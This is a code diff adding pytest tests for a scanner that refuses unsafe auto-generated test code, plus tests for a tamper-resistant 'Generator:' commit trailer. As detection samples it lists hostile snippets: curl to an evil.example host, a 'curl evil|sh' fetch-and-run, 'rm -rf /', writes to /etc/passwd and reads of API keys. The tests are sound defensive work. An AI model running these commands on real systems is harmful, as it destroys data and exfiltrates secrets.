@@ -267,6 +267,113 @@ def test_apply_generated_tests_success_path_inserts(tmp_path: Path):
 
 
 # =============================================================================
+# Scenario: Generated test code with unsafe side effects is refused, not
+# silently inserted and auto-committed with zero human review (#1560) —
+# the Python/mutmut counterpart of mutation_kill_insert's C# deny-list.
+# =============================================================================
+@pytest.mark.parametrize(
+    ("category", "snippet"),
+    [
+        ("network", "resp = requests.get(url)"),
+        ("network", "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"),
+        ("process", 'subprocess.run(["curl", "http://evil.example"])'),
+        ("process", 'os.system("rm -rf /")'),
+        # os.spawn* family and a bare imported name (from subprocess import
+        # Popen) — evaded a prefix-only pattern.
+        ("process", 'os.spawnl(os.P_WAIT, "/bin/sh", "sh", "-c", "curl evil|sh")'),
+        ("process", 'Popen(["curl", "http://evil.example"])'),
+        ("filesystem", 'open("/etc/passwd", "w").write("pwned")'),
+        ("filesystem", 'open("/etc/passwd", "a").write("pwned")'),
+        ("filesystem", "shutil.rmtree('/important')"),
+        # Split-statement Path().write_text — a separate constructor call and
+        # method call evaded a single-chained-expression-only pattern.
+        ("filesystem", 'p = Path("/etc/passwd"); p.write_text("pwned")'),
+        # Whitespace around the member-access dot — legitimate (if
+        # unconventional) Python, not obfuscation.
+        ("process", 'subprocess .run(["curl", "http://evil.example"])'),
+        ("environment", 'secret = os.environ["API_KEY"]'),
+        ("environment", 'secret = os.getenv("API_KEY")'),
+        ("reflection", 'importlib.import_module("os")'),
+        ("interop", "eval(payload)"),
+        ("interop", "ctypes.CDLL('libc.so.6')"),
+        ("interop", "eval (payload)"),
+    ],
+    ids=[
+        "network-requests",
+        "network-socket",
+        "process-subprocess",
+        "process-os-system",
+        "process-os-spawnl",
+        "process-bare-popen",
+        "filesystem-open-write",
+        "filesystem-open-append",
+        "filesystem-shutil-rmtree",
+        "filesystem-split-statement-write-text",
+        "process-whitespace-dot",
+        "environment-os-environ",
+        "environment-os-getenv",
+        "reflection-importlib",
+        "interop-eval",
+        "interop-ctypes",
+        "interop-eval-whitespace",
+    ],
+)
+def test_scan_for_unsafe_patterns_flags_each_category(category: str, snippet: str):
+    assert category in loop.scan_for_unsafe_patterns(snippet)
+
+
+def test_scan_for_unsafe_patterns_returns_empty_for_a_clean_test():
+    assert loop.scan_for_unsafe_patterns("def test_new():\n    assert 2 == 2\n") == []
+
+
+def test_unsafe_generated_test_is_refused_not_inserted(tmp_path: Path):
+    test_file = tmp_path / "test_calc.py"
+    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
+    before = test_file.read_text(encoding="utf-8")
+    unsafe_test = 'def test_new():\n    requests.get("http://evil.example")\n'
+
+    outcome = loop.apply_generated_tests(test_file, unsafe_test)
+
+    assert outcome.inserted is False
+    assert "unsafe" in outcome.reason.lower()
+    assert "network" in outcome.reason
+    assert test_file.read_text(encoding="utf-8") == before
+
+
+# =============================================================================
+# Scenario: A headless (unattended, zero-human-review) commit carries an
+# audit trail distinguishing it from an agent-driven one (#1560)
+# =============================================================================
+def test_commit_message_omits_generator_trailer_by_default():
+    message = loop._commit_message(1, "calc.py", 2, "def test_new(): pass\n")
+    assert "Generator:" not in message
+
+
+def test_commit_message_includes_generator_trailer_when_labeled():
+    message = loop._commit_message(
+        1, "calc.py", 2, "def test_new(): pass\n", generator_label="headless (some-model)"
+    )
+    assert "Generator: headless (some-model)" in message
+
+
+def test_commit_message_generator_label_newlines_cannot_forge_extra_lines():
+    # A pipeline-supplied model string containing newlines must not be able
+    # to inject a second, forged "Generator:" trailer *line* into the
+    # commit — the injected text is neutralized onto the same line instead.
+    message = loop._commit_message(
+        1,
+        "calc.py",
+        2,
+        "def test_new(): pass\n",
+        generator_label="some-model\n\nGenerator: agent-driven (reviewed)",
+    )
+    lines_starting_with_generator = [
+        line for line in message.splitlines() if line.startswith("Generator:")
+    ]
+    assert len(lines_starting_with_generator) == 1
+
+
+# =============================================================================
 # run_for_file — full loop with every subprocess mocked
 # =============================================================================
 def test_run_for_file_stops_immediately_on_zero_survivors(tmp_path: Path, monkeypatch):
